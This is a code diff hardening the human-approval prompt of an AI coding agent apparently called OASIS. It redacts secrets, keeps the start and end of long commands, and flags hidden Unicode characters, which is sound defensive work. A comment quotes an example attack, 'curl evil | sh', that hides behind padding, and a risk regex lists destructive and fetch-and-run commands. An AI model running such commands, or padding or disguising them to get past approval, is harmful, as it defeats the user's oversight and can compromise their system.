@@ -6,6 +6,7 @@
  * formats before text is shown in an approval card or copied into logs.
  */
 import { redactSecretText } from './secret-shield.mjs';
+import { showHiddenCharacters } from './untrusted-content.mjs';
 
 export function redactApprovalSecrets(value) {
   return redactSecretText(String(value == null ? '' : value), { token: '[redacted secret]' })
@@ -13,6 +14,16 @@ export function redactApprovalSecrets(value) {
     .replace(/(\b(?:authorization|proxy-authorization)\s*[:=]\s*(?:bearer\s+)?)[^\s"'\x60,;]+/gi, '$1[redacted]')
     .replace(/(--?(?:api[_-]?key|access[_-]?token|refresh[_-]?token|password|passwd|secret|token|authorization|credential|private[_-]?key|client[_-]?secret)\s+)(?!(?:"|'?)\[redacted(?:\s+secret)?\](?:"|'?)(?=$|[\s,;]))(?:"[^"]*"|'[^']*'|[^\s,;]+)/gi, '$1[redacted]')
     .replace(/(\b(?:api[_ -]?key|access[_ -]?token|refresh[_ -]?token|password|passwd|secret|token|credential|private[_ -]?key|client[_ -]?secret)\b["']?\s*[:=]\s*["']?)(?!\[redacted(?:\s+secret)?\])[^"'\s,;]+/gi, '$1[redacted]');
+}
+
+// Long text keeps its start and its end. A cut at the end alone let a command
+// hide its real work behind padding (`echo aaaa…; curl evil | sh`).
+function headAndTail(text, limit) {
+  const value = String(text || '');
+  if (value.length <= limit) return value;
+  const head = Math.ceil(limit * 0.6);
+  const tail = limit - head;
+  return value.slice(0, head) + '\n  … [' + (value.length - limit) + ' characters in the middle not shown] …\n  ' + value.slice(-tail);
 }
 
 function safeLabel(value, fallback = 'the requested item') {
@@ -72,7 +83,7 @@ export function formatApprovalDiff(toolName, input = {}) {
 }
 
 export function formatApprovalMessage(prompt, meta = {}) {
-  const original = redactApprovalSecrets(String(prompt == null ? '' : prompt).trim()).slice(0, 3500);
+  const original = redactApprovalSecrets(String(prompt == null ? '' : prompt).trim());
   const tool = String(meta && meta.tool || '').toLowerCase();
   const input = meta && meta.input && typeof meta.input === 'object' ? meta.input : {};
   const path = inputValue(input, 'path');
@@ -97,7 +108,7 @@ export function formatApprovalMessage(prompt, meta = {}) {
   } else if (tool === 'run_command' || tool === 'run_shell' || tool === 'powershell' || /^Run this command in the workspace\?/i.test(original)) {
     const match = original.match(/^Run this command in the workspace\?\s*\n\s*([^\n]+)/i);
     const commandText = command || (match && match[1].trim()) || '';
-    message = 'OASIS wants to run this command in your project:\n  ' + (commandText ? redactApprovalSecrets(commandText).slice(0, 1200) : '[command details shown below]') +
+    message = 'OASIS wants to run this command in your project:\n  ' + (commandText ? headAndTail(redactApprovalSecrets(commandText), 4000).replace(/\n(?! {2})/g, '\n  ') : '[command details shown below]') +
       '\nCommands can change project files or run project scripts. Read the command before you approve it.';
     risky = /\b(?:sudo|su\s+-|rm\s+-rf|mkfs(?:\.|\s)|diskpart|format\s+[a-z]:|shutdown|reboot|drop\s+(?:database|table)|chmod\s+-R\s+777|curl\b[^\n]*\|\s*(?:sh|bash))\b/i.test(commandText);
     if (/HIGH RISK:/i.test(original)) risky = true;
@@ -118,11 +129,16 @@ export function formatApprovalMessage(prompt, meta = {}) {
       const body = line.trim().replace(/[ \t\f\v]+/g, ' ');
       return body && /^[ \t]{2,}\S/.test(line) ? '  ' + body : body;
     }).join('\n').replace(/\n{3,}/g, '\n\n');
-    const clipped = normalized.length > 1800 ? normalized.slice(0, 1800) + '\n… [' + (normalized.length - 1800) + ' more characters not shown]' : normalized;
+    const clipped = headAndTail(normalized, 3000);
     message = 'OASIS is asking permission to take this action:\n' + (clipped || 'The action details were not provided.');
     risky = /\b(?:delete|remove|install|uninstall|overwrite|cannot be undone|high risk|format|drop database|sudo|rm\s+-rf|start the local.*gateway|detached background process|expose the local api)\b/i.test(original);
   }
 
   if (risky) message = 'WARNING — RISKY ACTION\n' + message;
+  // Hidden and direction-changing characters are shown as <U+XXXX>, here too:
+  // the command line above is rebuilt from the raw arguments.
+  const shown = showHiddenCharacters(message);
+  if (shown.count) { message = shown.text; risky = true; }
+  if (/^Warning: this request contains \d+ hidden/.test(original)) risky = true;
   return { message, risky, diff: formatApprovalDiff(tool, input) };
 }
